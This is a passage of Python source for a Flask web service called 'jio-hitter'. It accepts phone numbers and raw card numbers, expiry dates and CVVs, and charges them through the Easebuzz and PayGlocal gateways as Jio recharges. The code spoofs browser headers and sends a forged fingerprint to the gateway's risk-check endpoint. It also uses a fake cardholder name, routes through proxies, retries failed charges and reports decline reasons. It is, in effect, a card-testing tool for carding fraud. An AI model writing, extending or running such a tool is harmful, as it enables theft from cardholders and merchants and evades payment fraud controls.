            extra = {"amount_source": src} if debug else {}
            if debug:
                extra["easebuzz_page_head"] = (r11.url + " || " + (r11.text or ""))[:600]
            if debug:
                extra["debug_trace"] = found_amounts
            return _resp("error", "api error", number, masked,
                         amount=real_amt, plan=plan_name, gate=gateway,
                         **extra), ""

        gateway = "payglocal"
        gl_token = m_gl.group(1)


        jwt_pay = _jwt_payload(gl_token)
        if jwt_pay:
            _scan_json_for_amounts(jwt_pay, "r11_xgl_jwt", found_amounts)

        gl_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"

        def _ph(ref, ct=None, origin=None, extra=None):
            h = {"Accept": "application/json, text/plain, */*",
                 "Accept-Language": lg,
                 "Cache-Control": "no-cache", "Pragma": "no-cache",
                 "Referer": ref, "User-Agent": ua,
                 "sec-ch-ua": ch, "sec-ch-ua-mobile": mob, "sec-ch-ua-platform": plat,
                 "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
                 "Sec-Fetch-Site": "same-origin",
                 "x-request-time": str(int(time.time() * 1000))}
            if ct:     h["Content-Type"] = ct
            if origin: h["Origin"] = origin
            if extra:  h.update(extra)
            return h


        print("\n[12] PG init...", flush=True)
        r12 = _req("GET", "https://api.payglocal.com/gl/v2/payments/redirect/dc",
                   params={"x-gl-token": gl_token},
                   headers=_ph(gl_ref, extra={"x-gl-current-host": "api.payglocal.com",
                                               "x-gl-gid": "gl_payflow-ui",
                                               "x-gl-pb-tag-id": "",
                                               "x-gl-previous-host": "https://pay.easebuzz.in/",
                                               "x-gl-referrer-mismatch": "false",
                                               "x-gl-trusted-referrer": "https://pay.easebuzz.in"}))
        _scan_text_for_amounts(r12.text, "r12_html", found_amounts)
        try:
            _scan_json_for_amounts(r12.json(), "r12_json", found_amounts)
        except Exception:
            pass


        print("\n[13] Paynow...", flush=True)
        r13 = _req("POST", "https://api.payglocal.com/gl/v2/payments/pd/paynow",
                   params={"x-gl-token": gl_token},
                   headers=_ph(gl_ref, ct="application/json", origin="https://api.payglocal.com"),
                   json={"isEnc": "false",
                         "payload": {"customerCurrency": "INR", "saveCurrencyPreference": False,
                                     "browserDetails": {"colorDepth": sc["depth"],
                                                        "javaEnabled": False,
                                                        "javaScripEnabled": True,
                                                        "language": lg.split(",")[0],
                                                        "screenHeight": sc["h"],
                                                        "screenWidth": sc["w"],
                                                        "timeZone": -330},
                                     "billingData": {"addressCountry": "FR"},
                                     "shippingData": {}, "agreedOnTnCs": True}})
        _scan_text_for_amounts(r13.text, "r13_html", found_amounts)
        try:
            _scan_json_for_amounts(r13.json(), "r13_json", found_amounts)
        except Exception:
            pass


        print("\n[14] Risk fingerprint...", flush=True)
        r14 = _req("POST", "https://api.payglocal.com/gl/v1/payments/risk/fp",
                   params={"x-gl-token": gl_token},
                   headers=_ph(gl_ref, ct="application/json", origin="https://api.payglocal.com"),
                   json={"requestId": f"{int(time.time()*1000)}.{random.randint(100000,999999)}",
                         "visitorId": "Y8c4sEunqz0opl0b6YAd",
                         "visitorFound": True, "confidenceScore": 1})
        try:
            _scan_json_for_amounts(r14.json(), "r14_json", found_amounts)
        except Exception:
            pass
        kid = r14.json().get("data", {}).get("kid", "")
        print(f"  kid: {kid}", flush=True)
        if not kid:
            real_amt, src = _pick_real_amount(found_amounts, plan_amount)
            extra = {"amount_source": src} if debug else {}
            if debug:
                extra["debug_trace"] = found_amounts
            return _resp("error", "api error", number, masked,
                         amount=real_amt, plan=plan_name, gate=gateway,
                         **extra), ""


        print("\n[15] Charging card...", flush=True)
        time.sleep(random.uniform(0.5, 1.2))
        r15 = _req("POST", "https://api.payglocal.com/gl/v2/payments/dc/ipay",
                   params={"x-gl-token": gl_token},
                   headers=_ph(gl_ref, ct="application/json", origin="https://api.payglocal.com"),
                   json={"isEnc": "false", "kid": kid,
                         "payload": {"cardNumber": card["cc"],
                                     "expiryMonth": card["mm"], "expiryYear": card["yy"],
                                     "cvv": card["cvv"], "cardHolderName": "John Doe",
                                     "saveCard": False,
                                     "browserDetails": {"colorDepth": sc["depth"],
                                                        "javaEnabled": False,
                                                        "javaScriptEnabled": True,
                                                        "language": lg.split(",")[0],
                                                        "screenHeight": sc["h"],
                                                        "screenWidth": sc["w"],
                                                        "timeZone": -330, "userAgent": ua}}})
        result = r15.json()
        print(f"\n  Final result: {result}", flush=True)


        _scan_json_for_amounts(result, "r15_payglocal", found_amounts)

        pay_status = result.get("status") or ""
        pay_reason = result.get("reasonCode") or ""
        pay_data   = result.get("data") or {}

        errs = result.get("errors") or {}
        if not isinstance(errs, dict):
            errs = {}

        detailed = str(errs.get("detailedMessage") or "").strip()
        if not detailed:
            detailed = str(result.get("message") or "").strip()

        bot_status, short_code = _classify(pay_status, detailed, pay_data, pay_reason)


        real_amt, src = _pick_real_amount(found_amounts, plan_amount)

        print(f"\n  Amount trace ({len(found_amounts)} hits):", flush=True)
        for f in found_amounts[:20]:
            print(f"    ₹{f['value']:<10} ← {f['source']}", flush=True)
        print(f"  → Using ₹{real_amt}  (source: {src})", flush=True)

        extra = {"amount_source": src} if debug else {}
        if debug:
            extra["debug_trace"] = found_amounts

        return _resp(
            bot_status, short_code,
            number, masked,
            amount=real_amt, plan=plan_name, gate=gateway,
            **extra,
        ), pay_reason

    except Exception as e:
        emsg = str(e)
        if "proxy" in emsg.lower() or "resolve" in emsg.lower() or "407" in emsg:
            return _resp("error", "proxy error — check the proxies loaded", number, masked, gate=gateway), ""
        raise e
        import traceback
        traceback.print_exc()
        return _resp("error", "internal error", number, masked, gate=gateway), ""




@app.route("/", methods=["GET"])
def health():
    return jsonify({
        "status": "ok",
        "service": "jio-hitter",
        "endpoint": "/rc?jio=<number>&amount=<amt>&cc=<cc|mm|yy|cvv>",
        "version": "v11",
    })


@app.route("/rc", methods=["GET"])
def rc():
    number = (request.args.get("jio") or request.args.get("number") or "").strip()
    amount = (request.args.get("amount") or "").strip()
    cc_raw = (request.args.get("cc") or "").strip()
    proxy  = (request.args.get("proxy") or "").strip() or None
    debug  = (request.args.get("debug") or "").strip() in ("1", "true", "yes")

    if not number or not re.fullmatch(r"\d{10}", number):
        return jsonify(_resp("error", "invalid amount", number, "")), 400
    if not amount:
        return jsonify(_resp("error", "invalid amount", number, "")), 400
    try:
        amount_f = float(amount)
    except ValueError:
        return jsonify(_resp("error", "invalid amount", number, "")), 400
    if amount_f <= 0:
        return jsonify(_resp("error", "invalid amount", number, "")), 400

    card = _parse_card(cc_raw)
    if not card:
        return jsonify(_resp("error", "invalid cc format", number, "")), 400

    brand = _detect_brand(card["cc"])
    masked = _mask(card["cc"])
    if brand["brand"] not in SUPPORTED_BRANDS:
        print(f"\n=== /rc REJECTED (brand={brand['brand']}) {number} | {masked} ===", flush=True)
        result = _resp("error", "card brand not supported",
                       number, masked, amount=amount_f)
        _log_result(number, masked, result)
        return jsonify(result)

    print(f"\n=== /rc {number} | ₹{amount_f:.0f} (input) | {masked} | proxy={bool(proxy)} debug={debug} ===", flush=True)

    result = None
    reason_code = ""
    for attempt in range(1, MAX_RETRIES + 2):
        if attempt > 1:
            delay = random.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX)
            print(f"\n  ⟳ Retry {attempt - 1}/{MAX_RETRIES} in {delay:.1f}s...", flush=True)
            time.sleep(delay)

        result, reason_code = _run_jio(number, card, amount_f, proxy, debug=debug)
        if result["status"] != "error":
            break

    _log_result(number, masked, result, reason_code)
    return jsonify(result)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5002))
    app.run(host="0.0.0.0", port=port, threaded=True)